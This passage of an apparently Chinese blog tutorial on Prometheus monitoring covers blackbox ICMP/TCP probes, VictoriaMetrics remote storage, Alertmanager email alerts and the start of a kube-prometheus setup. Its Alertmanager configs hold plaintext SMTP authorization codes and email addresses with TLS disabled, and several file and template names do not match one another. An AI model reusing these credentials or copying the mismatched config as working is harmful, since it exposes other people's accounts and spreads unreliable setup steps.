class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 修改Prometheus配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>scrape_configs:<br>  ...<br>  - job_name: <span class="hljs-string">&#x27;blackbox-exporter-icmp&#x27;</span><br>    metrics_path: /probe<br>    params:<br>      <span class="hljs-comment"># 如果不指定模块，则默认类型为&quot;http_2xx&quot;，不能乱写!乱写监控不到服务啦!</span><br>      module: [icmp]<br>    static_configs:<br>      - targets:<br>          - 10.0.0.41<br>          - 10.0.0.42<br>    relabel_configs:<br>      - source_labels: [__address__]<br>        target_label: __param_target<br>      - source_labels: [__param_target]<br>        <span class="hljs-comment"># 指定注意的是，如果instance不修改，则instance和&quot;__address__&quot;的值相同</span><br>        <span class="hljs-comment"># target_label: ip</span><br>        target_label: instance<br>      - target_label: __address__<br>        replacement: 10.0.0.32:9115 <br>        <br>2 检查配置文件是否正确并重新加载配置<br>[root@prometheus-server31 ~]# rr<br><br>3 访问prometheus的WebUI<br>http://10.0.0.31:9090/targets<br><br>4.访问blackbox的WebUI<br>http://10.0.0.32:9115/<br><br>5.grafana过滤<span class="hljs-built_in">jobs</span>数据<br>基于<span class="hljs-string">&quot;blackbox-exporter-icmp&quot;</span>标签进行过滤。<br></code></pre></td></tr></table></figure><h4 id="基于blackbox的TCP案例监控服务存活"><a href="#基于blackbox的TCP案例监控服务存活" class="headerlink" title="基于blackbox的TCP案例监控服务存活"></a>基于blackbox的TCP案例监控服务存活</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 修改Prometheus配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br> <br>...<br>scrape_configs:<br>  ...<br>  - job_name: <span class="hljs-string">&#x27;blackox-exporter-tcp&#x27;</span><br>    metrics_path: /probe<br>    params:<br>      module: [tcp_connect]<br>    static_configs:<br>      - targets:<br>          - 10.0.0.41:80<br>          - 10.0.0.42:22<br>          - 10.0.0.31:9090<br>    relabel_configs:<br>      - source_labels: [__address__]<br>        target_label: __param_target<br>      - source_labels: [__param_target]<br>        target_label: instance<br>      - target_label: __address__<br>        replacement: 10.0.0.32:9115<br>        <br>2 检查配置文件是否正确并重新加载配置文件<br>[root@prometheus-server31 ~]# rr<br><br>3 访问prometheus的WebUI<br>http://10.0.0.31:9090/targets<br><br>4.访问blackbox exporter的WebUI<br>http://10.0.0.32:9115/<br><br>5.使用grafana查看数据<br>基于<span class="hljs-string">&quot;blackbox-exporter-tcp&quot;</span>标签进行过滤。<br></code></pre></td></tr></table></figure><h2 id="27、远端存储VictoriaMetrics"><a href="#27、远端存储VictoriaMetrics" class="headerlink" title="27、远端存储VictoriaMetrics"></a>27、远端存储VictoriaMetrics</h2><p>VictoriaMetrics是一个快速、经济高效且可扩展的监控解决方案和时间序列数据库。</p><p>普罗米修斯可以将数据远程存储到VictoriaMetrics。默认情况下，普罗米修斯数据存储于本地文件的 TSDB 中，不利于容灾和做数据管理，若用于生产一般需要搭配第三方的如 InfulxDB 进行使用。大数据量的场景下，指标的收集和管理性能存在一定的瓶颈。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">下载victoriametrics<br>wget https://github.com/VictoriaMetrics/VictoriaMetrics/releases/download/v1.93.16/victoria-metrics-linux-amd64-v1.93.16.tar.gz<br><br>解压软件包 <br>[root@prometheus-server32 ~]# tar xf victoria-metrics-linux-amd64-v1.93.16.tar.gz -C /usr/local/bin/<br><br>编写启动脚本<br><span class="hljs-built_in">cat</span> &gt; /etc/systemd/system/victoria-metrics.service &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">[Unit]</span><br><span class="hljs-string">Description= Linux VictoriaMetrics Server</span><br><span class="hljs-string">Documentation=https://docs.victoriametrics.com/</span><br><span class="hljs-string">After=network.target</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Service]</span><br><span class="hljs-string">ExecStart=/usr/local/bin/victoria-metrics-prod  \</span><br><span class="hljs-string">   -httpListenAddr=0.0.0.0:8428 \</span><br><span class="hljs-string">   -storageDataPath=/data/victoria-metrics \</span><br><span class="hljs-string">   -retentionPeriod=6</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Install]</span><br><span class="hljs-string">WantedBy=multi-user.target</span><br><span class="hljs-string">EOF</span><br><br>systemctl daemon-reload<br>systemctl <span class="hljs-built_in">enable</span> --now victoria-metrics.service<br>systemctl status victoria-metrics<br><br>检查端口是否存活<br>[root@prometheus-server32 ~]# ss -ntl | grep 8428<br>LISTEN 0      4096         0.0.0.0:8428      0.0.0.0:* <br><br>查看webUI<br>http://10.0.0.32:8428/<br></code></pre></td></tr></table></figure><p><strong>prometheus配置VictoriaMetrics远端存储</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">修改prometheus的配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br><br>...<br>  - job_name: node-exporters<br>    metrics_path: /metrics<br>    scheme: http<br>    static_configs:<br>    - targets:<br>      - 10.0.0.41:9100<br>      - 10.0.0.42:9100<br>      - 10.0.0.43:9100<br>    <br><span class="hljs-comment"># 在顶级字段中配置VictoriaMetrics地址</span><br>remote_write:<br>  - url: http://10.0.0.32:8428/api/v1/write<br><br><br>停止prometheus服务<br>[root@prometheus-server31 ~]# systemctl stop prometheus-server<br><br>手动启动prometheus服务，因为启动脚本定义了之前普罗米修斯的数据目录，这里是要将之后的数据写入到vtmetrics，所以需要手动起服务<br>[root@prometheus-server31 ~]# /softwares/prometheus-2.53.2.linux-amd64/prometheus    --config.file=/softwares/prometheus-2.53.2.linux-amd64/prometheus.yml<br></code></pre></td></tr></table></figure><p><strong>vtmetrics查看数据</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">node_cpu_seconds_total&#123;instance=<span class="hljs-string">&quot;10.0.0.41:9100&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/85bfa65bb4094b33b86d2302c22c293f.png" alt="在这里插入图片描述"></p><p><strong>配置grafana数据源和url</strong></p><p>这里数据源更改为mtmstrics的地址</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/5bbee7effec2429ca77dd12340f75053.png" alt="在这里插入图片描述"></p><p><strong>导入模板</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1806<br></code></pre></td></tr></table></figure><h2 id="28、altermanager监控告警"><a href="#28、altermanager监控告警" class="headerlink" title="28、altermanager监控告警"></a>28、altermanager监控告警</h2><p>用于prometheus server的告警功能的组件，目前支持多种告警媒介，包括但不限于邮件告警，钉钉告警，企业微信告警等。</p><p><strong>部署altermanager组件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.下载软件包<br>wget https://github.com/prometheus/alertmanager/releases/download/v0.27.0/alertmanager-0.27.0.linux-amd64.tar.gz<br><br>2.解压软件包<br>[root@prometheus-server32 ~]# tar xf alertmanager-0.27.0.linux-amd64.tar.gz -C /softwares/<br><br>3 修改alermanager的配置文件<br>[root@prometheus-server32 ~]# <span class="hljs-built_in">cat</span> &gt; /softwares/alertmanager-0.27.0.linux-amd64/alertmanager.yml &lt;&lt;<span class="hljs-string">&#x27;EOF&#x27;</span><br>global:<br>  resolve_timeout: 5m<br>  smtp_from: <span class="hljs-string">&#x27;y10539035@qq.com&#x27;</span><br>  smtp_smarthost: <span class="hljs-string">&#x27;smtp.qq.com:465&#x27;</span><br>  smtp_auth_username: <span class="hljs-string">&#x27;y10534035@qq.com&#x27;</span><br>  smtp_auth_password: <span class="hljs-string">&#x27;nvkhwupusuxubefe&#x27;</span><br>  smtp_require_tls: <span class="hljs-literal">false</span><br>  smtp_hello: <span class="hljs-string">&#x27;qq.com&#x27;</span><br>route:<br>  group_by: [<span class="hljs-string">&#x27;alertname&#x27;</span>]<br>  group_wait: 5s<br>  group_interval: 5s<br>  repeat_interval: 5m<br>  receiver: <span class="hljs-string">&#x27;email&#x27;</span><br>receivers:<br>- name: <span class="hljs-string">&#x27;email&#x27;</span><br>  email_configs:<br>  - to: <span class="hljs-string">&#x27;y10534135@qq.com&#x27;</span><br>    send_resolved: <span class="hljs-literal">true</span><br>inhibit_rules:<br>  - source_match:<br>      severity: <span class="hljs-string">&#x27;critical&#x27;</span><br>    target_match:<br>      severity: <span class="hljs-string">&#x27;warning&#x27;</span><br>    equal: [<span class="hljs-string">&#x27;alertname&#x27;</span>, <span class="hljs-string">&#x27;dev&#x27;</span>, <span class="hljs-string">&#x27;instance&#x27;</span>]<br>EOF<br><br>启动alermanager并访问webUI<br>[root@prometheus-server32 ~]# <span class="hljs-built_in">cd</span> /softwares/alertmanager-0.27.0.linux-amd64/<br>[root@prometheus-server32 alertmanager-0.27.0.linux-amd64]# ./alertmanager <br><br>--------------------------------------------------------<br>相关参数说明:<br>global:<br>  resolve_timeout:<br>  解析超时时间。<br>  smtp_from:<br>  发件人邮箱地址。<br>  smtp_smarthost:<br>  邮箱的服务器的地址及端口，例如:  <span class="hljs-string">&#x27;smtp.qq.com:465&#x27;</span>。<br>  smtp_auth_username:<br>  发送人的邮箱用户名。<br>  smtp_auth_password:<br>  发送人的邮箱授权码。<br>  smtp_require_tls:<br>  是否基于tls加密。<br>  smtp_hello:<br>  邮箱服务器，例如: <span class="hljs-string">&#x27;qq.com&#x27;</span>。<br>route:<br>  group_by: [<span class="hljs-string">&#x27;alertname&#x27;</span>]<br>  group_wait: 5s<br>  group_interval: 5s<br>  repeat_interval:<br>  重复报警的间隔时间，如果没有解即报警问题，则会间隔指定时间一直触发报警，比如:5m。<br>  receiver: <br>  采用什么方式接收报警，例如<span class="hljs-string">&#x27;email&#x27;</span>。<br>receivers:<br>- name: <br>定义接收者的名称，注意这里的name要和上面的route对应，例如: <span class="hljs-string">&#x27;email&#x27;</span><br>  email_configs:<br>  - to: <br>  邮箱发给谁。<br>    send_resolved: <span class="hljs-literal">true</span><br>inhibit_rules:<br>  - source_match:<br>      severity: <br>      匹配报警级别，例如: <span class="hljs-string">&#x27;critical&#x27;</span>。<br>    target_match:<br>      severity: <span class="hljs-string">&#x27;warning&#x27;</span><br>    equal: [<span class="hljs-string">&#x27;alertname&#x27;</span>, <span class="hljs-string">&#x27;dev&#x27;</span>, <span class="hljs-string">&#x27;instance&#x27;</span>]<br>   <br>--------------------------------------------------------------------------<br>prometheus配置alermanager作为告警媒介<br>1 修改配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>alerting:<br>  alertmanagers:<br>    - static_configs:<br>        - targets:<br>            - 10.0.0.32:9093<br>rule_files:<br>  - <span class="hljs-string">&quot;/softwares/prometheus-2.53.2.linux-amd64/rules/linux92.yml&quot;</span><br><br><br>...<br>scrape_configs:<br>  ...<br>  - job_name: node-exporter<br>    static_configs:<br>    - targets:<br>      - 10.0.0.41:9100<br>      - 10.0.0.42:9100<br>      - 10.0.0.43:9100<br>...<br><br>2 修改告警规则<br>[root@prometheus-server31 ~]# <span class="hljs-built_in">mkdir</span> -pv /softwares/prometheus-2.53.2.linux-amd64/rules<br><br>[root@prometheus-server31 ~]# <span class="hljs-built_in">cat</span> &gt;  /softwares/prometheus-2.53.2.linux-amd64/rules/linux.yml &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">groups:</span><br><span class="hljs-string">- name: container-runtime</span><br><span class="hljs-string">  rules:</span><br><span class="hljs-string">  - alert: container-42节点挂掉啦</span><br><span class="hljs-string">    expr: up&#123;instance=&quot;10.0.0.42:9100&quot;&#125; == 0</span><br><span class="hljs-string">    for: 15s</span><br><span class="hljs-string">    labels:</span><br><span class="hljs-string">      school: 001</span><br><span class="hljs-string">      class: 002</span><br><span class="hljs-string">    annotations:</span><br><span class="hljs-string">      summary: &quot;&#123;&#123; $labels.instance &#125;&#125; 已停止运行超过 15s！&quot;</span><br><span class="hljs-string">  - alert: container-43节点挂掉啦</span><br><span class="hljs-string">    expr: up&#123;instance=&quot;10.0.0.43:9100&quot;&#125; == 0</span><br><span class="hljs-string">    for: 15s</span><br><span class="hljs-string">    labels:</span><br><span class="hljs-string">      school: 001</span><br><span class="hljs-string">      class: 002</span><br><span class="hljs-string">    annotations:</span><br><span class="hljs-string">      summary: &quot;&#123;&#123; $labels.instance &#125;&#125; 联邦模式已停止运行超过 15s！&quot;</span><br><span class="hljs-string">EOF</span><br><br>3 检查配置并重新加载prometheus的配置<br>[root@prometheus-server31 ~]# check <br>[root@prometheus-server31 ~]# rr<br><br>4 查看prometheus server的WebUI<br>http://10.0.0.31:9090/target<br><br>5 查看alermanager的WebUI<br>h/softwares/alertmanager-0.27.0.linux-amd64<br><br>[root@prometheus-server32 alertmanager-0.27.0.linux-amd64]# <span class="hljs-built_in">mkdir</span> tmpl<br><br>2 创建模板实例，工作中可以考虑嵌入公司的logo<br>[root@prometheus-server32 alertmanager-0.27.0.linux-amd64]# <span class="hljs-built_in">cat</span> &gt; tmpl/email.tmp1 &lt;&lt;<span class="hljs-string">&#x27;EOF&#x27;</span> <br>&#123;&#123; define <span class="hljs-string">&quot;001.html&quot;</span> &#125;&#125;<br>&lt;h1 style=<span class="hljs-string">&#x27;color: red;&#x27;</span>&gt;啦啦啦:  https://www.cherry.com/&lt;/h1&gt;<br>&lt;table border=<span class="hljs-string">&quot;1&quot;</span>&gt;<br>        &lt;<span class="hljs-built_in">tr</span>&gt;<br>                &lt;th&gt;报警项&lt;/th&gt;<br>                &lt;th&gt;实例&lt;/th&gt;<br>                &lt;th&gt;报警阀值&lt;/th&gt;<br>                &lt;th&gt;开始时间&lt;/th&gt;<br>        &lt;/tr&gt;<br>        &#123;&#123; range <span class="hljs-variable">$i</span>, <span class="hljs-variable">$alert</span> := .Alerts &#125;&#125;<br>                &lt;<span class="hljs-built_in">tr</span>&gt;<br>                        &lt;td&gt;&#123;&#123; index <span class="hljs-variable">$alert</span>.Labels <span class="hljs-string">&quot;alertname&quot;</span> &#125;&#125;&lt;/td&gt;<br>                        &lt;td&gt;&#123;&#123; index <span class="hljs-variable">$alert</span>.Labels <span class="hljs-string">&quot;instance&quot;</span> &#125;&#125;&lt;/td&gt;<br>                        &lt;td&gt;&#123;&#123; index <span class="hljs-variable">$alert</span>.Annotations <span class="hljs-string">&quot;value&quot;</span> &#125;&#125;&lt;/td&gt;<br>                        &lt;td&gt;&#123;&#123; <span class="hljs-variable">$alert</span>.StartsAt &#125;&#125;&lt;/td&gt;<br>                &lt;/tr&gt;<br>        &#123;&#123; end &#125;&#125;<br>&lt;/table&gt;<br><br>&lt;img src=<span class="hljs-string">&quot;https://www.cherry.com/static/images/header/logo.png&quot;</span>&gt;<br><br>&#123;&#123; end &#125;&#125;<br>EOF<br><br>3 alertmanager引用自定义模板文件<br>[root@prometheus-server32 alertmanager-0.27.0.linux-amd64]# <span class="hljs-built_in">cat</span> alertmanager.yml <br>global:<br>  resolve_timeout: 5m<br>  smtp_from: <span class="hljs-string">&#x27;31013067@qq.com&#x27;</span><br>  smtp_smarthost: <span class="hljs-string">&#x27;smtp.qq.com:465&#x27;</span><br>  smtp_auth_username: <span class="hljs-string">&#x27;31013067@qq.com&#x27;</span><br>  smtp_auth_password: <span class="hljs-string">&#x27;ysfkvbpjeddhbi&#x27;</span><br>  smtp_require_tls: <span class="hljs-literal">false</span><br>  smtp_hello: <span class="hljs-string">&#x27;qq.com&#x27;</span><br><br>route:<br>  group_by: [<span class="hljs-string">&#x27;alertname&#x27;</span>]<br>  group_wait: 5s<br>  group_interval: 5s<br>  repeat_interval: 5m<br>  receiver: <span class="hljs-string">&#x27;email&#x27;</span><br><br>templates:<br>  - <span class="hljs-string">&#x27;./tmp1/*.tmp1&#x27;</span><br><br>receivers:<br>- name: <span class="hljs-string">&#x27;email&#x27;</span><br>  email_configs:<br>  - to: <span class="hljs-string">&#x27;31013067@qq.com&#x27;</span><br>    send_resolved: <span class="hljs-literal">true</span><br>    headers: &#123; Subject: <span class="hljs-string">&quot;[WARN] 报警邮件&quot;</span> &#125;<br>    html: <span class="hljs-string">&#x27;&#123;&#123; template &quot;cherry.html&quot; . &#125;&#125;&#x27;</span><br><br>inhibit_rules:<br>  - source_match:<br>      severity: <span class="hljs-string">&#x27;critical&#x27;</span><br>    target_match:<br>      severity: <span class="hljs-string">&#x27;warning&#x27;</span><br>    equal: [<span class="hljs-string">&#x27;alertname&#x27;</span>, <span class="hljs-string">&#x27;dev&#x27;</span>, <span class="hljs-string">&#x27;instance&#x27;</span>]<br><br>4 alertmanager语法检查<br>[root@prometheus-server32 alertmanager-0.27.0.linux-amd64]# <span class="hljs-built_in">pwd</span><br>/softwares/alertmanager-0.27.0.linux-amd64<br><br>[root@prometheus-server32 alertmanager-0.27.0.linux-amd64]# ./amtool check-config ./alertmanager.yml <br><br>5 重新加载配置信息<br>[root@prometheus-server32 alertmanager-0.27.0.linux-amd64]# ./alertmanager <br><br>6 查看WebUi观察配置是否生效<br>http://10.0.0.32:9093/#/status<br><br>---------------------------------------------<br>prometheus需要修改以下规则文件<br>1 修改规则文件<br>[root@prometheus-server31 ~]# <span class="hljs-built_in">cat</span> /softwares/prometheus-2.53.2.linux-amd64/rules/linux92.yml <br><span class="hljs-built_in">groups</span>:<br>- name: linux92-container-runtime<br>  rules:<br>  - alert: container-42节点挂掉啦<br>    <span class="hljs-built_in">expr</span>: up&#123;instance=<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>&#125; == 0<br>    <span class="hljs-keyword">for</span>: 15s<br>    labels:<br>      school: 001<br>      class: 002<br>    annotations:<br>      summary: <span class="hljs-string">&quot;&#123;&#123; .instance &#125;&#125; 已停止运行超过 15s！&quot;</span><br>  <span class="hljs-comment"># 添加此行用于获取阈值</span><br>      value: <span class="hljs-string">&quot;&#123;&#123; <span class="hljs-variable">$value</span> &#125;&#125;&quot;</span><br>  - alert: container-43节点的挂掉啦<br>    <span class="hljs-built_in">expr</span>: up&#123;instance=<span class="hljs-string">&quot;10.0.0.43:9100&quot;</span>&#125; == 0<br>    <span class="hljs-keyword">for</span>: 15s<br>    labels:<br>      school: 01<br>      class: 02<br>    annotations:<br>      summary: <span class="hljs-string">&quot;&#123;&#123; .instance &#125;&#125; 联邦模式已停止运行超过 15s！&quot;</span><br>  <span class="hljs-comment"># 添加此行用于获取阈值</span><br>      value: <span class="hljs-string">&quot;&#123;&#123; <span class="hljs-variable">$value</span> &#125;&#125;&quot;</span><br>      <br>检查语法并重新加载配置文件<br>[root@prometheus-server31 ~]# check <br>[root@prometheus-server31 ~]# rr<br></code></pre></td></tr></table></figure><h2 id="29、监控K8S集群"><a href="#29、监控K8S集群" class="headerlink" title="29、监控K8S集群"></a>29、监控K8S集群</h2><p><strong>prometheus-operator</strong></p><p>prometheus-operator可以一键实现对K8S集群的监控</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">GitHub地址: https://github.com/prometheus-operator/kube-prometheus<br><br>基于K8S版本选择合适的prometheus-operator<br>https://github.com/prometheus-operator/kube-prometheus#compatibility<br></code></pre></td></tr></table></figure><h4 id="1-prometheus内部监控k8s集群"><a href="#1-prometheus内部监控k8s集群" class="headerlink" title="1.prometheus内部监控k8s集群"></a>1.prometheus内部监控k8s集群</h4><p>普罗米修斯可以部署在k8s内部，也可以部署在k8s外部，企业中一般都是部署在k8s内部</p><p><strong>在K8S集群部署prometheus</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs bash">下载软件包<br>wget https://github.com/prometheus-operator/kube-prometheus/archive/refs/tags/v0.11.0.tar.gz<br><br>解压软件包<br>[root@master231 ~]# tar xf kube-prometheus-0.11.0.tar.gz -C /softwares/<br><br>切换工作目录，进入到prometheus-operator主目录<br>[root@master231 ~]# <span class="hljs-built_in">cd</span> /softwares/kube-prometheus-0.11.0/<br><br>更改yaml文件，自定义资源<br>[root@master231 kube-prometheus-0.11.0]# vim manifests/prometheusAdapter-deployment.yaml<br>......<br>        <span class="hljs-comment"># image: k8s.gcr.io/prometheus-adapter/prometheus-adapter:v0.9.1</span><br>        